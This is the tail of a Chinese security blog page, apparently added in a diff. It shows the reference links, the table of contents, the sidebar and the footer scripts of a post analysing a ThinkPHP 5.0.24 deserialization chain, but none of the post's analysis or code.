+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://c1oudfl0w0.github.io/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+              <a href="/tags/ThinkPHP/" rel="tag"># ThinkPHP</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/vscode-xdebug%E8%B0%83%E8%AF%95php%E4%BB%A3%E7%A0%81.html" rel="prev" title="vscode+xdebug调试php代码">
+      <i class="fa fa-chevron-left"></i> vscode+xdebug调试php代码
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/%E8%AE%B0%E5%BD%95kali%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91.html" rel="next" title="记录kali安装蚁剑">
+      记录kali安装蚁剑 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%B4%A2"><span class="nav-number">1.</span> <span class="nav-text">ThinkPHP5.0.24 反序列化漏洞探索</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.2.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4-%E5%AD%90%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="nav-number">1.2.1.</span> <span class="nav-text">命名空间&amp;子命名空间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF"><span class="nav-number">1.2.2.</span> <span class="nav-text">类的继承</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#trait%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="nav-number">1.2.3.</span> <span class="nav-text">trait修饰符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP%E5%BC%80%E5%8F%91%E6%89%8B%E5%86%8C"><span class="nav-number">1.3.</span> <span class="nav-text">ThinkPHP开发手册</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80"><span class="nav-number">1.3.1.</span> <span class="nav-text">基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">命名规范</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">目录结构</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%B6%E6%9E%84"><span class="nav-number">1.3.2.</span> <span class="nav-text">架构</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">基础概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#URL%E8%AE%BF%E9%97%AE"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">URL访问</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%E8%AE%BE%E8%AE%A1"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">模块设计</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE"><span class="nav-number">1.3.3.</span> <span class="nav-text">配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%A0%BC%E5%BC%8F"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">配置格式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E5%8A%A0%E8%BD%BD"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">配置加载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">读取配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A9%E5%B1%95%E9%85%8D%E7%BD%AE"><span class="nav-number">1.3.3.4.</span> <span class="nav-text">扩展配置</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E5%BC%95%E5%AF%BCstart-php"><span class="nav-number">1.3.4.</span> <span class="nav-text">框架引导start.php</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="nav-number">1.4.</span> <span class="nav-text">ThinkPHP5.0.x反序列化链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.4.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-number">1.4.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POP%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-number">1.4.3.</span> <span class="nav-text">POP链分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POP%E9%93%BE%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%9B%BE"><span class="nav-number">1.4.4.</span> <span class="nav-text">POP链调用过程图</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.6.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
